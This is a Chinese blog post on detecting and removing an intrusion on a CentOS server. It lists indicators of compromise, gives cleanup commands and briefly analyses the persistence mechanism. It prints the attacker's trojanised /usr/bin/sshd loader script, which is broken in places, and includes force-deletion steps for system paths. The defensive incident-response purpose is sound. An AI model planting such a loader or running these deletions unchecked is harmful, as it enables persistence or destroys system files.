---
title: centos服务器被入侵
description: 出现-bash-4.2#，那么有可能你的机器已经被入侵了，附上我遇到的这种情况，看看对你有没有帮助。
date: 2021-09-20 10:33:57
---
## root用户登录出现-bash-4.2 #

在修复过.bashrc文件或者恢复过.bashrc后，仍然出现-bash-4.2#，那么有可能你的机器已经被入侵了，附上我遇到的这种情况，看看对你有没有帮助。
服务器入侵检查和处理

## 1、确认是否被入侵

出现以下现象或存在以下目录
root用户登录出现 `-bash-4.2#`

`netstat` 命令回显为空

检查系统用户列表是否有 gh0stx, sclipicibosu, mexalzsherifu 三个或其中任意一个

查看是否存在`/var/tmp/.ladyg0g0/`目录

查看是否存在`/var/tmp/.sl/`目录

检查`/root/.ssh/authorized_keys`是否存在异常

查看是否存在`/usr/.SQL-Unix/.SQL/.db` 或者 `/var/tmp/.SQL-Unix/.SQL/.db`

查看是否存在`/usr/tmp/.ladyg0g0/.pr1nc35` 或者 `/var/tmp/.ladyg0g0/.pr1nc35`

查看是否存在`/usr/bin/.pidsclip`

查看是否存在`/usr/bin/.locationesclipiciu`

检查`/usr/bin/sshd` 内容是否是如下代码段

```sell
#!/bin/bash
locatieasdf=$(cat /usr/bin/.locationesclipiciu)
if [ ! -d  ]; then
        mkdir
        rsync -r /usr/bin/.locationesclipiciu/ /
        sleep 1
        /.b4nd1d0 > /dev/null 2>&1 & disown
else
        if [ ! -f  /.dorel ]; then
                rsync -r /usr/bin/.locationesclipiciu/ /
                sleep 1
                /.b4nd1d0 > /dev/null 2>&1 & disown
fi
```

## 2、威胁处理

删除恶意脚本
强制删除 /var/tmp/.sl/ 目录

强制删除 /var/tmp/.ladyg0g0/ 目录

强制删除 /usr/bin/.locationesclipiciu

强制删除 /usr/bin/.pidsclip

强制删除 /root/.b4nd1d0

强制删除 /root/.dorel

强制删除 /usr/.SQL-Unix/ 目录

强制删除 /usr/tmp 目录

强制删除 /usr/bin/sshd

恢复.bashrc文件 cp /etc/skel/.bash* /root/

修改.bashrc文件

export PS1='[\u@\h \W]\$'

1. 删除 gh0stx, sclipicibosu, mexalzsherifu 中存在的用户

userdel –r sclipicibosu//删除不成功就使用chmod修改/etc/passwd和/etc/shadow权限，再使用vim删除该用户
1
reboot重启

passwd root //修改密码为强口令

## 3、恶意脚本分析

往系统服务中注册了一个私有服务 /lib/systemd/system/myservice.service
myservice私有服务中进行了一个文件同步操作 rsync -r /usr/bin/.locationesclipiciu/
同步了 /var/tmp/.sl/ 下的内容
重写 .bashrc，导致常用命令失效
后续可能进行的行为暂时不明
